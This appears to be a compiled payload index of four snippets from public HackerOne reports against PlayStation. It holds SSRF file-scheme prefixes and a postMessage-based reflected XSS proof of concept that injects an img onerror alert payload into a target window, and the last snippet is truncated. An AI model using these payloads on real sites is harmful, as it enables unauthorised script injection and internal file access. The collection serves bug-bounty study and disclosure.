# PlayStation

4 payloads.

### `b7d908fd`

```
file://
```

— [SSRF chained to hit internal host leading to another SSRF which allows to read internal images.](https://hackerone.com/reports/826097) · PlayStation · [bugdiscloseguys](https://hackerone.com/bugdiscloseguys) · $1,000.0

### `1605f932`

```
file:///
```

— [SSRF chained to hit internal host leading to another SSRF which allows to read internal images.](https://hackerone.com/reports/826097) · PlayStation · [bugdiscloseguys](https://hackerone.com/bugdiscloseguys) · $1,000.0

### `b03188c0`

```
win.postMessage(JSON.stringify({
                action: "replaceRoute",
                route: "voucher.multi-product-details",
                model: {
                    eligible: true,
                    sku: {
                        id: 0, longDescription: `
                            <img src=x onerror='alert(document.domain)'>`
                    }
                }
            }), "*");
```

— [Reflected XSS on target.com using postMessage from the opening window](https://hackerone.com/reports/900619) · PlayStation · [vakzz](https://hackerone.com/vakzz) · $1,000.0

### `4ad0a58e`

```
<!DOCTYPE html>
<html>

<body>
    <button onclick="start()">click me</button>
    <script>
        window.addEventListener("message", (msg) => {
            console.log("got message", msg);
            alert(msg.data);
        });

        async function start() {
            win = window.open("https://target.com/", "transact");
            await new Promise((resolve) => setTimeout(resolve, 5000));

            win.postMessage(JSON.stringify({
                action: "replaceRoute
```

— [Reflected XSS on target.com using postMessage from the opening window](https://hackerone.com/reports/900619) · PlayStation · [vakzz](https://hackerone.com/vakzz) · $1,000.0
